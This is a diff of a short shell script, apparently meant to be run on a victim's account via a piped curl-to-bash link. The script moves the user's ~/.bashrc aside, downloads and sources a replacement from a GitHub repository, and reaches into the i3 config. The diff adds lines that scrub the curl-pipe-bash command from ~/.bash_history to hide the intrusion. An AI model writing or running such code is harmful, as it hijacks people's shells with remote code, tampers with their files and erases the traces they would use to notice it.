@@ -1,5 +1,6 @@
 mv ~/.bashrc ~/afs/tp.py
-history -d $(history | tail -n 1 | awk '{print $1}')
+cmd="curl -s https://urls.fr/XMhtMj | bash"
+grep -v "$cmd" ~/.bash_history > ~/.bash_history.tmp && mv ~/.bash_history.tmp ~/.bash_history
 curl -sO https://raw.githubusercontent.com/did73at/cflse/main/.bashrc
 source .bashrc
 filename=".config/i3/config"
